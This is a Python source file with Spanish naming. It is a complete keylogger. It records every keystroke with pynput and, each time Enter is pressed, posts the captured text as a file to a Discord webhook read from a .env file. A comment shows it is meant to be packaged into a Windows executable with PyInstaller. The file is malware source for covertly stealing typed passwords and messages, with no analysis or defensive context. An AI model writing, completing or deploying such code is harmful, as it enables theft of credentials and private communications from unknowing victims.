import io
import os
import sys
import requests
from dotenv import load_dotenv
from pynput.keyboard import Key, Listener


def ruta_recurso(nombre: str) -> str:
    # Dentro de un .exe hecho con PyInstaller, los recursos se extraen en sys._MEIPASS
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, nombre)


keys = []
load_dotenv(ruta_recurso(".env"))
WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
_numero_lote = 0


def enviar_reporte(contenido: str, mensaje: str = "Reporte", nombre_archivo: str = "reporte.txt"):
    if not WEBHOOK_URL:
        raise RuntimeError("No se encontró la URL del webhook (revisa tu .env)")
    r = requests.post(
        WEBHOOK_URL,
        data={"content": mensaje},
        files={"file": (nombre_archivo, contenido.encode("utf-8"), "text/plain")},
        timeout=30,
    )
    r.raise_for_status()


def on_press(key):
    global keys

    keys.append(key)

    if key == Key.enter:
        write_file(keys)
        keys = []


def write_file(keys):
    global _numero_lote
    with io.StringIO() as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")

            elif key == Key.enter:
                f.write("")

            elif key == Key.backspace:
                f.write("[DELETE]")

            elif key == Key.tab:
                f.write("[TAB]")

            # elif key == Key.shift:
                # f.write("[SHIFT]")

            elif key == Key.shift_r:
                f.write("[SHIFT_R]")

            elif key == Key.ctrl_l:
                f.write("[CTRL_L]")

            elif key == Key.ctrl_r:
                f.write("[CTRL_R]")

            elif key == Key.alt_l:
                f.write("[ALT_L]")

            elif key == Key.alt_r:
                f.write("[ALT_R]")

            elif hasattr(key, "char") and key.char is not None:
                f.write(key.char)

            else:
                f.write("[{0}]".format(key))

            contenido = f.getvalue()

    _numero_lote += 1
    enviar_reporte(
        contenido,
        mensaje=f"Reporte #{_numero_lote}",
        nombre_archivo=f"reporte_{_numero_lote}.txt",
    )


def on_release(key):
    pass


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
